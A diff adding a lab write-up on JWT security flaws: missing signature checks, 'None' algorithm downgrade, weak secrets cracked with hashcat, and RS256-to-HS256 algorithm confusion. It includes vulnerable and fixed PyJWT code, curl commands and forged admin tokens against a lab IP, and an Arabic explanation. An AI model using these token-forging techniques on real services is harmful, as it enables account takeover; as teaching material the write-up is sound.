@@ -1,4 +1,4 @@
-# JWT Security
+<img width="1597" height="688" alt="image" src="https://github.com/user-attachments/assets/bc8bb0e6-aa52-402d-bfdf-075320365472" /><img width="1597" height="688" alt="image" src="https://github.com/user-attachments/assets/8af6e765-d16a-4c46-9579-6e3bd7b78758" /><img width="1332" height="195" alt="image" src="https://github.com/user-attachments/assets/bb3c5f46-0915-4fbf-bc0d-21f0a9679641" /># JWT Security
 
 <img width="1902" height="357" alt="image" src="https://github.com/user-attachments/assets/47163caa-6e2c-41d2-ae67-0ebba4ebf141" />
 
@@ -242,6 +242,459 @@ flag = self.db_lookup(username, "flag")
   <summary>Signature Validation Mistakes</summary>
 
 
+The second common mistake with JWTs is not correctly verifying the signature. If the signature isn't correctly verified, a threat actor may be able to forge a valid JWT token to gain access to another user's account. Let's examine the common signature verification issues.
+
+Not Verifying the Signature
+
+The first issue with signature validation is when there is no signature validation. If the server does not verify the signature of the JWT, then it is possible to modify the claims in the JWT to whatever you prefer them to be. While it is uncommon to find APIs where no signature validation is performed, signature validation may have been omitted from a single endpoint within the API. Depending on the sensitivity of the endpoint, this can have a significant business impact.
+
+**Practical Example 2**
+
+Let's authenticate to the API:
+
+`curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://MACHINE_IP/api/v1.0/example2`
+
+Once authenticated, let's verify our user:
+
+`curl -H 'Authorization: Bearer [JWT Token]' http://MACHINE_IP/api/v1.0/example2?username=user`
+
+However, let's try to verify our user without the signature, remove the third part of the JWT (leaving only the dot) and make the request again. You will see that the verification still works! This means that the signature is not being verified. Modify the admin claim in the payload to be `1` and try to verify as the admin user to retrieve your flag.
+
+**The Development Mistake**
+
+In the example, the signature is not being verified, as shown below:
+
+```
+payload = jwt.decode(token, options={'verify_signature': False})
+```
+
+﻿While it is rare to see this on normal APIs, it often happens on server-to-server APIs. In cases where a threat actor has direct access to the backend server, JWTs can be forged.
+
+**The Fix**
+
+The JWT should always be verified or additional authentication factors, such as certificates, should be used for server-to-server communication. The JWT can be verified by providing the secret (or public key), as shown in the example below:
+
+```
+payload = jwt.decode(token, self.secret, algorithms="HS256")
+```
+
+Downgrading to None
+
+Another common issue is a signature algorithm downgrade. JWTs support the `None` signing algorithm, which effectively means that no signature is used with the JWT. While this may sound silly, the idea behind this in the standard was for server-to-server communication, where the signature of the JWT was verified in an upstream process. Therefore, the second server would not be required to verify the signature. However, suppose the developers do not lock in the signature algorithm or, at the very least, deny the `None` algorithm. In that case, you can simply change the algorithm specified in your JWT as `None`, which would then cause the library used for signature verification to always return true, thus allowing you again to forge any claims within your token.
+
+**Practical Example 3\
+**
+
+Authenticate to the API to receive your JWT and then verify your user. To perform this attack, you will need to manually alter the  the `alg` claim in the header to be `None`. You can use [CyberChef](https://gchq.github.io/CyberChef/) for this making use of the URL-Encoded Base64 option. Submit the JWT again to verify that it is still accepted, even if the signature is no longer valid, as changes have been made. You can then alter the `admin` claim to recover the flag.
+
+**The Development Mistake**
+
+While this may seem like the same issue as before, from a development perspective, it is slightly more complex. Sometimes, developers want to ensure their implementation accepts several JWT signature verification algorithms. The implementation would then usually read the header of the JWT and parse found alg into the signature verification component, as shown below:
+
+```
+header = jwt.get_unverified_header(token)
+
+signature_algorithm = header['alg']
+
+payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
+```
+
+However, when the threat actor specified `None` as the algorithm, signature verification is bypassed. [Pyjwt](https://pyjwt.readthedocs.io/en/stable/), the JWT library used in this room, has implemented security coding to prevent this issue. If a secret is specified when the None algorithm is selected, an exception is raised.**\
+**
+
+**The Fix**
+
+If multiple signature algorithms should be supported, the supported algorithms should be supplied to the decode function as an array list, as shown below:
+
+```
+payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])
+
+username = payload['username']
+flag = self.db_lookup(username, "flag")
+
+```
+
+Weak Symmetric Secrets
+
+If a symmetric signing algorithm is used, the security of the JWT relies on the strength and entropy of the secret used. If a weak secret is used, it may be possible to perform offline cracking to recover the secret. Once the secret value is known, you can again alter the claims in your JWT and recalculate a valid signature using the secret.
+
+**Practical Example 4\
+**
+
+For this example, a weak secret was used to generate the JWT. Once you receive a JWT, you have several options to crack the secret. For our example, we will talk about using [Hashcat](https://hashcat.net/hashcat/) to crack the JWT's secret. You could also use other solutions such as [John](https://www.openwall.com/john/) as well. You can use the following steps to crack the secret:
+
+1.  Save the JWT to a text file called jwt.txt.
+2.  Download a common JWT secret list. For this room, you can use `wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list` to download such a list.
+3.  Use Hashcat to crack the secret using `hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list`
+
+Once you know what the secret is, you can forge a new admin token to recover the flag!
+
+**The Development Mistake**
+
+The issue occurs when a weak JWT secret is used. This can often occur when developers are in a hurry or copy code from examples.
+
+**The Fix**
+
+A secure secret value should be selected. As this value will be used in software and not by humans, a long, random string should be used for the secret.
+
+Signature Algorithm Confusion
+
+The last common issue with signature validation is when an algorithm confusion attack can be performed. This is similar to the `None` downgrade attack, however, it specifically happens with confusion between symmetric and asymmetric signing algorithms. If an asymmetric signing algorithm, for example, RS256 is used, it may be possible to downgrade the algorithm to HS256. In these cases, some libraries would default back to using the public key as the secret for the symmetric signing algorithm. Since the public key can be known, you can forge a valid signature by using the HS256 algorithm in combination with the public key.
+
+**Practical Example 5\
+**
+
+This is similar to example 3. Except this time, the None algorithm is not allowed. However, once you authenticate to the example, you will also receive the public key. As the public key isn't regarded as sensitive, it is common to find the public key. Sometimes, the public key is even embedded as a claim in the JWT. In this example, you must downgrade the algorithm to HS256 and then use the public key as the secret to sign the JWT. You can use the script provided below to assist you in forging this JWT:
+
+```
+import jwt
+
+public_key = "ADD_KEY_HERE"
+
+payload = {
+    'username' : 'user',
+    'admin' : 0
+}
+
+access_token = jwt.encode(payload, public_key, algorithm="HS256")
+print (access_token)
+```
+
+Note: We recommend that you use the AttackBox for this practical example since Pyjwt is already installed for you. Before running the script, edit the file `/usr/lib/python3/dist-packages/jwt/algorithms.py` using your favorite text editor and go to line `143`. Then proceed to comment out lines `143-146` and run the script. If you are using your own VM, you may have to install Pyjwt (`pip3 install pyjwt`) to use this script. You will also need to tamper with the Pyjwt library's algorithm.py file on line `258` to remove the `is_ssh_key` condition as a patch for this vulnerability was released. Keep in mind that this placement can vary per VM and installation. An easier method if you are not comfortable with library code edits is to make use of [jwt.io](https://jwt.io/). Once you verify it works, you can alter the claims to make yourself an admin and recover the flag.
+
+**The Development Mistake**
+
+The mistake in this example is similar to that of example 3 but a bit more complex. While the None algorithm is disallowed, the key issue stems from both symmetric and asymmetric signature algorithms being allowed, as shown in the example below:
+
+```
+payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512", "RS256", "RS384", "RS512"])
+```
+
+Care should be given never to mix signature algorithms together as the secret parameter of the decode function can be confused between being a secret or a public key.**\
+**
+
+**The Fix**
+
+While both types of signature algorithms can be allowed, a bit more logic is required to ensure that there is no confusion, as shown in the example below:
+
+```
+header = jwt.get_unverified_header(token)
+
+algorithm = header['alg']
+payload = ""
+
+if "RS" in algorithm:
+    payload = jwt.decode(token, self.public_key, algorithms=["RS256", "RS384", "RS512"])
+elif "HS" in algorithm:
+    payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])
+
+username = payload['username']
+flag = self.db_lookup(username, "flag")
+```
+
+
+
+---
+---
+
+
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.65.159.101/api/v1.0/example2
+```
+
+
+
+```json
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"
+}
+```
+
+> #### Once authenticated, let's verify our user:
+
+```
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' http://10.65.159.101/api/v1.0/example2?username=user
+```
+
+
+<img width="1346" height="217" alt="image" src="https://github.com/user-attachments/assets/c3070bfb-6476-4a28-8569-31123a7347e1" />
+
+### let's try to remove signiature and change 0 to 1 
+
+
+<img width="1241" height="403" alt="image" src="https://github.com/user-attachments/assets/43b7d0ab-08e2-4660-8a56-0672a3cb6193" />
+
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyAgInVzZXJuYW1lIjogInVzZXIiLCAgImFkbWluIjogMX0=
+```
+
+
+## now let's verify as admin
+
+```
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyAgInVzZXJuYW1lIjogInVzZXIiLCAgImFkbWluIjogMX0=.' http://10.65.159.101/api/v1.0/example2?username=admin
+```
+
+
+<img width="1332" height="222" alt="image" src="https://github.com/user-attachments/assets/ae6344a7-56db-4aa7-884c-c7412383daa8" />
+
+
+## `Downgrading to None`
+
+
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.65.159.101/api/v1.0/example3
+```
+
+<img width="1332" height="195" alt="image" src="https://github.com/user-attachments/assets/83f07061-e2cd-486b-affd-1622e09fa852" />
+
+
+```json
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
+}
+```
+
+
+
+<img width="1274" height="406" alt="image" src="https://github.com/user-attachments/assets/e65b9ae8-29ff-4a11-844a-8047723e1cb2" />
+
+
+
+
+
+```
+curl -H 'Authorization: Bearer eyAgInR5cCI6ICJKV1QiLCAgImFsZyI6ICJOb25lIn0=.eyAgInVzZXJuYW1lIjogImFkbWluIiwgICJhZG1pbiI6IDF9.' http://10.65.159.101/api/v1.0/example3?username=admin
+```
+
+
+## `Weak Symmetric Secrets`
+
+
+```
+ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password4" }' http://10.65.159.101/api/v1.0/example4 
+```
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY
+```
+
+
+<img width="1300" height="617" alt="image" src="https://github.com/user-attachments/assets/c897d54f-7822-4d3c-a9ed-f31f2671b91b" />
+
+
+```
+hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
+```
+
+
+<img width="1354" height="503" alt="image" src="https://github.com/user-attachments/assets/57b65f66-d6f7-4016-b27e-66c855afb3a0" />
+
+
+
+```
+secret
+```
+
+
+
+
+<img width="768" height="604" alt="image" src="https://github.com/user-attachments/assets/3eb674ca-aeda-4455-8ae7-673a6892b700" />
+
+
+
+
+<img width="1366" height="163" alt="image" src="https://github.com/user-attachments/assets/71f482db-3625-4a42-af97-13bd77887a1f" />
+
+
+
+
+## `Signature Algorithm Confusion`
+
+
+
+
+<details>
+  <summary>explain in arabic</summary>
+
+
+🔐 Signature Algorithm Confusion Attack (JWT)
+=============================================
+
+الفكرة في سطر واحد
+------------------
+
+> **السيرفر يفتكر إنه بيستخدم RSA (public/private key)،\
+> والمهاجم يخليه يصدّق توكن متوقّع بـ HMAC باستخدام الـ public key كـ secret** 😈
+
+وده يحصل بسبب **خلط بين algorithms symmetric و asymmetric**.
+
+* * * * *
+
+🧠 نراجع الأساسيات بسرعة
+------------------------
+
+### 1️⃣ HS256 (Symmetric)
+
+-   نفس المفتاح:
+
+    -   للتوقيع ✍️
+
+    -   وللتحقق ✔️
+
+-   اسمه: **secret**
+
+`secret  → sign
+secret  → verify`
+
+* * * * *
+
+### 2️⃣ RS256 (Asymmetric)
+
+-   مفتاحين:
+
+    -   private key → sign
+
+    -   public key → verify
+
+`private key → sign
+public key  → verify`
+
+* * * * *
+
+🔥 فين الغلطة بقى؟
+------------------
+
+السيرفر بيقول:
+
+> أنا بدعم HS256 و RS256 مع بعض
+
+`jwt.decode(token, secret, algorithms=[
+  "HS256","HS384","HS512",
+  "RS256","RS384","RS512"
+])`
+
+💣 **كارثة**
+
+ليه؟
+
+لأن:
+
+-   `secret` هنا:
+
+    -   في HS = secret حقيقي
+
+    -   في RS = المفروض public key
+
+-   السيرفر **مش بيفرق**
+
+* * * * *
+
+🧨 السيناريو الهجومي (اللي بيحصل فعليًا)
+----------------------------------------
+
+### 👣 الخطوات:
+
+#### 1️⃣ السيرفر أصلاً بيستخدم RS256
+
+يعني التوكن الطبيعي شكله:
+
+`{
+  "alg": "RS256",
+  "typ": "JWT"
+}`
+
+#### 2️⃣ المهاجم يحصل على **public key**
+
+وده طبيعي جدًا:
+
+-   endpoint
+
+-   embedded في JWT
+
+-   ملف `.well-known`
+
+-   أو حتى في الصفحة
+
+> 🔑 public key **مش سرّي**
+
+* * * * *
+
+#### 3️⃣ المهاجم يغير الـ header
+
+من:
+
+`"alg": "RS256"`
+
+إلى:
+
+`"alg": "HS256"`
+
+* * * * *
+
+#### 4️⃣ المهاجم يعمل توقيع جديد
+
+لكن بـ:
+
+`secret = public key
+algorithm = HS256`
+
+📌 **ليه ده يشتغل؟**
+
+لأن:
+
+-   HS256 محتاج secret
+
+-   السيرفر هيستخدم نفس المتغير (`secret`)
+
+-   وهو أصلًا حاطط فيه الـ public key
+
+😵‍💫 **السيرفر يتلخبط**
+
+* * * * *
+
+✅ النتيجة
+---------
+
+السيرفر يقول:
+
+> ✔️ التوقيع صحيح\
+> ✔️ المستخدم admin\
+> ❌ اتخدعنا
+
+
+
+
+  
+</details>
+
+
+
+
+
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password5" }' http://10.65.159.101/api/v1.0/example5
+```
+
+<img width="1333" height="373" alt="image" src="https://github.com/user-attachments/assets/20177db6-41d9-4c82-a41e-786a3cf97e81" />
+
+
+```json
+{
+  "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q"
+}
+
+```
+
+
+
+
+
+<img width="1597" height="688" alt="image" src="https://github.com/user-attachments/assets/3674dfc4-1e73-4def-af71-ae338e0ada52" />
+
+
 
 
 
@@ -262,6 +715,40 @@ flag = self.db_lookup(username, "flag")
 
   
 </details>
+
+
+
+
+
+
+
+
+<details>
+  <summary>JWT Lifetimes</summary>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+</details>
+
+
 
 
 
